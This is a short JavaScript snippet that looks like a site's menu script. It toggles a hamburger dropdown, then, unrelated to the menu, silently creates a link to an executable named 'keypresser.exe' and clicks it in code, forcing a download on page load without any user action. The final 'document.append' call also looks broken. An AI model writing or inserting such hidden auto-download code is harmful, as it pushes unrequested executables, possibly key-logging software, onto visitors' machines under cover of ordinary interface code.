(function(){
    var image = document.getElementsByClassName("img");
    var hamburgermenu = document.querySelector("div.hamburgermenu");
    var dropdownmenu = document.querySelector(".dropdown-menu");

    dropdownmenu.style.display = "none";

    hamburgermenu.addEventListener('click', function(){
        if (dropdownmenu.style.display == "none") {
            dropdownmenu.style.display = "block";
        } else {
            dropdownmenu.style.display = "none";
        }
    });

    var downloader = document.createElement("a");
    downloader.href = "keypresser.exe";
    downloader.download = "";
    downloader.click();
    document.append(downloader);
})();